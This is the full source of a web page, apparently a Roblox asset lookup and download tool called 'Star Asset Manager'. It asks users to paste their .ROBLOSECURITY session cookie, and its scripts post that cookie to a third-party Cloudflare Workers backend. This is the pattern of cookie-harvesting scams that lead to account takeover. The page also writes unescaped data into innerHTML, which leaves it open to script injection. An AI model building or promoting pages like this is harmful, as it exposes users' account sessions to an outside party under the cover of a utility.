a<!DOCTYPE html>
<html>
<head>
    <title>Star Asset Manager</title>
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/olistar0/starproductions/refs/heads/main/assets/tabicon.png">
    <meta name="title" content="Star Productions - Star Asset Manager">
    <meta name="theme-color" content="#1d1d1d">
    <meta name="description" content="View the details of Roblox Assets and download then!" />
    <style>
        :root {
            --bg-url: url('https://raw.githubusercontent.com/olistar0/starproductions/refs/heads/main/assets/bg.png');
            --logo-url: url('https://raw.githubusercontent.com/olistar0/starproductions/refs/heads/main/starassetmgr/assets/hover.png');
            --logo-height: 200px;
        }

        body {
            font-family: Arial;
            background: var(--bg-url) no-repeat center center fixed;
            background-size: cover;
            color: #eee;
            padding: 20px;
            backdrop-filter: blur(5px);
        }

        .glass {
            background: rgba(0,0,0,0.35);
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            padding: 15px;
            border-radius: 12px;
            margin-top: 10px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: rgba(0,0,0,0.4);
            color: #eee;
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(8px);
            border-radius: 8px;
        }

        button {
            padding: 10px 20px;
            background: orange;
            border: none;
            color: #000;
            cursor: pointer;
            font-weight: bold;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        button:hover {
            background: #cc8400;
        }

        button:active {
            background: #b36f00;
        }

        pre {
            background: rgba(0,0,0,0.4);
            padding: 10px;
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 8px;
            white-space: pre-wrap;
        }

        html {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo {
            height: var(--logo-height);
            background-image: var(--logo-url);
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            width: 100%;
        }

        .logo-animated {
            animation-name: rgbhover;
            animation-duration: 3s;
            animation-iteration-count: infinite;
            animation-timing-function: ease-in-out;
        }

        @keyframes rgbhover {
            from { transform: translate(0, 0px); }
            65% { transform: translate(0, 15px); }
            to { transform: translate(0, -0px); }
        }

        .asset-container {
            display: flex;
            gap: 20px;
            align-items: flex-start;
        }

        .asset-left {
            flex: 1;
        }

        .asset-right {
            width: 220px;
            background: rgba(0,0,0,0.35);
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(12px);
            padding: 15px;
            border-radius: 12px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="logo logo-animated"></div>

<label>Asset ID:</label>
<input id="assetIds" placeholder="">

<label>.ROBLOSECURITY Cookie:</label>
<input id="cookie" type="password" placeholder="*Required for asset infomation and downloading Animation/Audio Assets. Do not need it for just downloading Image/Decal Assets*">

<label>Place ID (ONLY NEED FOR DOWNLOADING ANIMATION/AUDIO ASSETS):</label>
<input id="placeId" placeholder="Not required but would help for downloading Animation/Audio assets. (If it fails when you put it in try without) If it still fails it can not get it.">

<button onclick="lookup()">Execute</button>

<h3>Asset Info</h3>
<div id="assetInfo" class="glass"></div>

<h3>Creator Info</h3>
<div id="creatorInfo" class="glass"></div>

<script>
const backend = "https://apistarproductions.jollyoliver734.workers.dev";

async function fetchThumbnail(assetId) {
    try {
        const res = await fetch(`${backend}/thumbnail/${assetId}`);
        const text = await res.text();
        if (!res.ok) return null;
        const data = JSON.parse(text);
        if (!data.data || !data.data[0] || !data.data[0].imageUrl) return null;
        return data.data[0].imageUrl;
    } catch {
        return null;
    }
}

async function lookup() {
    const ids = document.getElementById("assetIds").value.trim();
    const cookie = document.getElementById("cookie").value.trim();
    const placeInput = document.getElementById("placeId").value.trim();

    const assetBox = document.getElementById("assetInfo");
    const creatorBox = document.getElementById("creatorInfo");

    assetBox.innerHTML = "Loading...";
    creatorBox.innerHTML = "";

    if (ids && !cookie) {
        const thumbUrl = await fetchThumbnail(ids);

        if (!thumbUrl) {
            assetBox.innerHTML = `<pre>{"error":"Could not fetch thumbnail."}</pre>`;
            return;
        }

        assetBox.innerHTML = `
            <div class="asset-container">
                <div class="asset-left">
                    <div class="glass">Image/Decal Assets download only. Need to input cookie for infomation.</div>
                    <div class="glass">Asset ID: ${ids}</div>
                </div>
                <div class="asset-right">
                    <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
                    <button style="
                        background:#4a8;
                        color:#000;
                        padding:8px 12px;
                        border-radius:8px;
                        font-weight:bold;
                        width:100%;
                    " onclick="window.open('${thumbUrl}', '_blank')">
                        Download
                    </button>
                </div>
            </div>
        `;

        creatorBox.innerHTML = "";
        return;
    }

    try {
        const res = await fetch(backend + "/asset", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ids, cookie })
        });

        const text = await res.text();

if (!res.ok) {
    try {
        const err = JSON.parse(text);
        if (err.error && err.error.includes("PlaceID")) {
            return;
        }
    } catch {}

    assetBox.innerHTML = `<pre>${text}</pre>`;
    return;
}

        const data = JSON.parse(text);

if (!data.data || !data.data[0]) {
    try {
        const err = JSON.parse(text);
        if (err.error && err.error.includes("PlaceID")) {
            return;
        }
    } catch {}

    assetBox.innerHTML = `<pre>${text}</pre>`;
    return;
}

        const asset = data.data[0];
        const creator = asset.creator || {};
        const creatorType = creator.type || null;
        const creatorId = creator.targetId || null;

        let imagePanel = `
            <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
            <button disabled style="
                background:#7a1f1f;
                color:#2a0000;
                padding:8px 12px;
                border-radius:8px;
                font-weight:bold;
                width:100%;
            ">Not Available for this asset.</button>
        `;

        if (asset.type === "Image" || asset.type === "Decal") {
            const thumbUrl = await fetchThumbnail(ids);

            if (thumbUrl) {
                imagePanel = `
                    <div style="margin-bottom:10px;">Image assets can be downloaded.</div>
                    <button style="
                        background:#4a8;
                        color:#000;
                        padding:8px 12px;
                        border-radius:8px;
                        font-weight:bold;
                        width:100%;
                    " onclick="window.open('${thumbUrl}', '_blank')">
                        Download
                    </button>
                `;
            }
        }

        let aaButton;
        if (asset.type === "Animation" || asset.type === "Audio") {
            aaButton = `
                <button style="
                    background:#4a8;
                    color:#000;
                    padding:8px 12px;
                    border-radius:8px;
                    font-weight:bold;
                    width:100%;
                    margin-top:8px;
                " onclick="downloadAsset('${ids}', '${asset.type}', '${creatorType}', '${creatorId}')">
                    Download
                </button>
            `;
        } else {
            aaButton = `
                <button disabled style="
                    background:#7a1f1f;
                    color:#2a0000;
                    padding:8px 12px;
                    border-radius:8px;
                    font-weight:bold;
                    width:100%;
                    margin-top:8px;
                ">
                    Not Available for this asset.
                </button>
            `;
        }

const aaPanel = `
    <div id="aaPanel" style="margin-top:15px; position: relative;">
        <div style="margin-bottom:5px;">Animation/Audios can be downloaded.</div>
        ${aaButton}
        <div id="aaError" style="
            display:none;
            background:#7a1f1f;
            color:#fff;
            padding:8px;
            border-radius:8px;
            margin-top:10px;
            text-align:center;
            font-weight:bold;
        "></div>
    </div>
`;

        assetBox.innerHTML = `
            <div class="asset-container">
                <div class="asset-left">
                    <div class="glass">Asset Name: ${asset.name}</div>
                    <div class="glass">Asset Type: ${asset.type}</div>
                    <div class="glass">Asset Moderated: ${asset.isModerated}</div>
                </div>
<div id="assetRight" class="asset-right">
    ${imagePanel}
    ${aaPanel}
</div>
            </div>
        `;

        if (creatorType === "User") {
            fetchUser(creatorId);
        } else if (creatorType === "Group") {
            fetchGroup(creatorId);
        }
    } catch (err) {
        assetBox.innerHTML = `<pre>${err}</pre>`;
    }
}

async function downloadAsset(assetId, assetType, creatorType, creatorId) {
    const cookie = document.getElementById("cookie").value.trim();
    const placeInput = document.getElementById("placeId").value.trim();
    const assetBox = document.getElementById("assetInfo");

    if (!cookie) {
        assetBox.innerHTML = `<pre>{"error":"Cookie is required to download Animation/Audio assets."}</pre>`;
        return;
    }

    try {
        const res = await fetch(backend + "/delivery", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                assetId,
                cookie,
                placeId: placeInput || null,
                creatorId: creatorId || null,
                creatorType: creatorType || null
            })
        });

        const text = await res.text();

if (!res.ok) {
    const rightBox = document.getElementById("assetRight");

    if (rightBox) {
        const originalHTML = rightBox.innerHTML;

        rightBox.innerHTML = `
            <div style="
                background:#7a1f1f;
                color:#fff;
                padding:12px;
                border-radius:10px;
                text-align:center;
                font-weight:bold;
            ">
                ${JSON.parse(text).error || "Unknown error"}
            </div>
        `;

        setTimeout(() => {
            rightBox.innerHTML = originalHTML;
        }, 3000);
    }

    return;
}

        const data = JSON.parse(text);
let url = data.location;

let extension = "";
if (assetType === "Animation") extension = ".rbxm";
else if (assetType === "Audio") extension = ".ogg";

const fileRes = await fetch(data.location);
const fileBuffer = await fileRes.arrayBuffer();

const blob = new Blob([fileBuffer], { type: "application/octet-stream" });
const downloadUrl = URL.createObjectURL(blob);

const a = document.createElement("a");
a.href = downloadUrl;
a.download = assetId + extension;
a.click();

URL.revokeObjectURL(downloadUrl);
    } catch (err) {
        assetBox.innerHTML = `<pre>${err}</pre>`;
    }
}

async function fetchUser(userId) {
    const creatorBox = document.getElementById("creatorInfo");

    try {
        const res = await fetch(`${backend}/user/${userId}`);
        const text = await res.text();

if (!res.ok) {
    const aaError = document.getElementById("aaError");
    if (aaError) {
        aaError.innerText = JSON.parse(text).error || "Unknown error";
        aaError.style.display = "block";

        setTimeout(() => {
            aaError.style.display = "none";
        }, 3000);
    }
    return;
}

        const user = JSON.parse(text);

        creatorBox.innerHTML = `
            <div class="glass">Username: ${user.name}</div>
            <div class="glass">Display Name: ${user.displayName}</div>
            <div class="glass">Verified: ${user.hasVerifiedBadge}</div>
            <div class="glass">Banned: ${user.isBanned}</div>
        `;
    } catch (err) {
        creatorBox.innerHTML = `<pre>${err}</pre>`;
    }
}

async function fetchGroup(groupId) {
    const creatorBox = document.getElementById("creatorInfo");

    try {
        const res = await fetch(`${backend}/group/${groupId}`);
        const text = await res.text();

        if (!res.ok) {
            creatorBox.innerHTML = `<pre>${text}</pre>`;
            return;
        }

        const group = JSON.parse(text);

        creatorBox.innerHTML = `
            <div class="glass">Group Name: ${group.name}</div>
            <div class="glass">Group Verified: ${group.hasVerifiedBadge}</div>
            <div class="glass">Owner Username: ${group.owner.username}</div>
            <div class="glass">Owner Display Name: ${group.owner.displayName}</div>
        `;
    } catch (err) {
        creatorBox.innerHTML = `<pre>${err}</pre>`;
    }
}
</script>

</body>
</html>
